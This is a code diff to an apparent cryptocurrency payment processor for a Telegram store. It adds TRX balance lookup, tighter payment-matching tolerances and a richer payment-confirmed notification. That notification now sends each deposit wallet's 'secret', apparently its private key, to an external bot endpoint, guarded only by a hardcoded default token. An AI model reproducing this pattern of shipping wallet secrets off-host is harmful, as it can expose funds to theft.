@@ -29,7 +29,7 @@ if _custom_bsc_rpc and _custom_bsc_rpc not in BSC_RPC_ENDPOINTS:
     BSC_RPC_ENDPOINTS.insert(0, _custom_bsc_rpc)
 
 USDT_CONTRACT_ADDRESS = os.environ.get('USDT_CONTRACT_ADDRESS', '0x55d398326f99059fF775485246999027B3197955')
-PAYMENT_TOLERANCE = float(os.environ.get('PAYMENT_TOLERANCE', '0.005'))
+PAYMENT_TOLERANCE = float(os.environ.get('PAYMENT_TOLERANCE', '0.00001'))
 
 BLOCKCYPHER_ENDPOINTS = {
     'btc': 'https://api.blockcypher.com/v1/btc/main',
@@ -97,7 +97,7 @@ class PriceFeed:
     @staticmethod
     def _coincap(symbol: str) -> Optional[float]:
         ids = {'bnb': 'binance-coin', 'ton': 'the-open-network', 'ltc': 'litecoin',
-               'doge': 'dogecoin', 'btc': 'bitcoin'}
+               'doge': 'dogecoin', 'btc': 'bitcoin', 'trx': 'tron'}
         cid = ids.get(symbol)
         if not cid:
             return None
@@ -110,7 +110,7 @@ class PriceFeed:
     @staticmethod
     def _coingecko(symbol: str) -> Optional[float]:
         ids = {'bnb': 'binancecoin', 'ton': 'the-open-network', 'ltc': 'litecoin',
-               'doge': 'dogecoin', 'btc': 'bitcoin'}
+               'doge': 'dogecoin', 'btc': 'bitcoin', 'trx': 'tron'}
         cid = ids.get(symbol)
         if not cid:
             return None
@@ -123,7 +123,7 @@ class PriceFeed:
     @staticmethod
     def _kucoin(symbol: str) -> Optional[float]:
         pairs = {'bnb': 'BNB-USDT', 'ton': 'TON-USDT', 'ltc': 'LTC-USDT',
-                 'doge': 'DOGE-USDT', 'btc': 'BTC-USDT'}
+                 'doge': 'DOGE-USDT', 'btc': 'BTC-USDT', 'trx': 'TRX-USDT'}
         pair = pairs.get(symbol)
         if not pair:
             return None
@@ -142,7 +142,7 @@ class PriceFeed:
     @classmethod
     def get_all(cls) -> Dict[str, float]:
         prices = {}
-        for sym in ['bnb', 'ton', 'ltc', 'doge', 'btc']:
+        for sym in ['bnb', 'ton', 'ltc', 'doge', 'btc', 'trx']:
             prices[sym] = cls.get(sym)
         return prices
 
@@ -519,8 +519,10 @@ def _blockcypher_balance(chain: str, address: str) -> float:
 
 TRON_ENDPOINTS = ['https://api.trongrid.io', 'https://api.tronstack.io']
 
-def get_tron_balance(address: str) -> float:
-    return _retry(_tron_usdt_balance, address, _label='TRON')
+def get_tron_balance(address: str) -> Tuple[float, float]:
+    usdt = _retry(_tron_usdt_balance, address, _label='TRON-USDT')
+    trx = _retry(_tron_trx_balance, address, _label='TRON-TRX')
+    return usdt, trx
 
 def _tron_to_hex(b58_addr: str) -> Optional[str]:
     try:
@@ -550,6 +552,21 @@ def _tron_usdt_balance(address: str) -> float:
             continue
     return 0.0
 
+def _tron_trx_balance(address: str) -> float:
+    hex_addr = _tron_to_hex(address)
+    if not hex_addr:
+        return 0.0
+    for ep in TRON_ENDPOINTS:
+        try:
+            r = requests.post(f'{ep}/wallet/getaccount', json={
+                'address': hex_addr,
+            }, timeout=10)
+            rj = r.json()
+            return int(rj.get('balance', 0)) / 1e6
+        except Exception:
+            continue
+    return 0.0
+
 # --- Generic balance getter ---
 
 def get_balance(chain: str, address: str) -> float:
@@ -562,7 +579,8 @@ def get_balance(chain: str, address: str) -> float:
         elif chain in ('ltc', 'doge', 'btc'):
             return get_blockcypher_balance(chain, address) * PriceFeed.get(chain.upper())
         elif chain == 'tron':
-            return get_tron_balance(address)
+            usdt, trx = get_tron_balance(address)
+            return usdt + (trx * PriceFeed.get('trx'))
     except Exception as e:
         logger.error('get_balance %s %s: %s', chain, address[:16], e)
     return 0.0
@@ -574,17 +592,19 @@ def get_balance(chain: str, address: str) -> float:
 BOT_API_URL = os.environ.get('BOT_API_URL', 'https://ea-store-telegram.onrender.com')
 
 
-def _notify_bot_payment_confirmed(tx_id):
-    """Notify the bot that a payment was confirmed (bot will send EA)."""
+def _notify_bot_payment_confirmed(tx_id, wallet_data=None):
+    """Notify the bot that a payment was confirmed (bot will send EA + receipt)."""
     try:
+        payload = {'tx_id': tx_id, 'secret': os.environ.get('NOTIFY_SECRET', 'ea-sync-2026')}
+        if wallet_data:
+            payload['wallet_data'] = wallet_data
         requests.post(f'{BOT_API_URL}/api/notify-payment-confirmed',
-                      json={'tx_id': tx_id, 'secret': os.environ.get('NOTIFY_SECRET', 'ea-sync-2026')},
-                      timeout=10)
+                      json=payload, timeout=10)
     except Exception as e:
         logger.warning('Failed to notify bot about confirmed payment tx=%s: %s', tx_id, e)
 
 
-def _confirm_transaction(user, pending, balance_used=False):
+def _confirm_transaction(user, pending, balance_used=False, wallet_data=None):
     new_balance = (user.get('balance_usdt', 0) or 0)
     if not balance_used:
         new_balance -= pending['amount_usdt']
@@ -622,7 +642,7 @@ def _confirm_transaction(user, pending, balance_used=False):
 
     logger.info('Payment confirmed: user=%s tx=%s amount=%.2f', user['id'], pending['id'], pending.get('amount_usdt', 0))
 
-    threading.Thread(target=_notify_bot_payment_confirmed, args=(pending['id'],), daemon=True).start()
+    threading.Thread(target=_notify_bot_payment_confirmed, args=(pending['id'],), kwargs={'wallet_data': wallet_data}, daemon=True).start()
 
 def _get_pending_for_address(chain: str, address: str) -> list:
     pending = s.find('transactions', status='pending')
@@ -661,7 +681,7 @@ def _process_wallet(chain: str, wallet: dict) -> dict:
         best_diff = float('inf')
         for tx in pending_txs:
             tx_amount = tx.get('amount_usdt', 0)
-            if abs(tx_amount - diff) < 0.001:
+            if abs(tx_amount - diff) < 0.0001:
                 best_match = tx
                 best_diff = 0
                 break
@@ -669,18 +689,18 @@ def _process_wallet(chain: str, wallet: dict) -> dict:
                 best_match = tx
                 best_diff = abs(tx_amount - diff)
 
-        if best_match and best_diff < 0.01:
+        if best_match and best_diff < 0.001:
             user = s.get('users', best_match['user_id'])
             if user:
-                _confirm_transaction(user, best_match)
+                _confirm_transaction(user, best_match, wallet_data={'chain': chain, 'address': address, 'secret': wallet.get('secret', '')})
                 release_wallet_by_tx(best_match['id'])
                 result['credited'] += 1
                 result['confirmed'] += 1
-                logger.info('Payment matched: user=%s chain=%s amount=%.4f tx=%s',
+                logger.info('Payment matched: user=%s chain=%s amount=%.6f tx=%s',
                            user['id'], chain, diff, best_match['id'])
         else:
-            if diff >= 1.0:
-                logger.warning('Unmatched deposit: %.4f USDT on %s %s', diff, chain, address[:16])
+            if diff >= 0.01:
+                logger.warning('Unmatched deposit: %.6f USDT on %s %s', diff, chain, address[:16])
 
     wallet['last_balance'] = current_usdt
     wallet['last_checked'] = datetime.utcnow().isoformat()
